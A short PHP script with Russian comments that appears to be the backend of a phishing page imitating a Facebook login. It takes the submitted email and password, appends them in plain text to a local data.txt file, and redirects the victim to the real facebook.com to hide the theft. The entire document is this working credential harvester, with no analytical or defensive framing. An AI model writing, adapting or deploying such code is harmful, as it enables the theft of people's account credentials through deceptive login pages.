$email = trim($_POST['email']);
$pass = trim($_POST['pass']);

$filePath = 'C:\Users\Пользователь\Desktop\site\data.txt'; // Укажите абсолютный путь к файлу

// Попытка открыть файл и запись данных с обработкой ошибок
if ($fp = fopen($filePath, 'a')) {
    if (fwrite($fp, "email: {$email}\n") === false) {
        // Обработка ошибки записи
        error_log("Ошибка записи email в файл {$filePath}");
    }
    if (fwrite($fp, "pass: {$pass}\n") === false) {
        // Обработка ошибки записи
        error_log("Ошибка записи pass в файл {$filePath}");
    }
    fwrite($fp, "---------------\n");
    fclose($fp);
} else {
    // Обработка ошибки открытия файла
    error_log("Ошибка открытия файла {$filePath}");
}

// Перенаправление
header('Location: https://facebook.com');
exit();
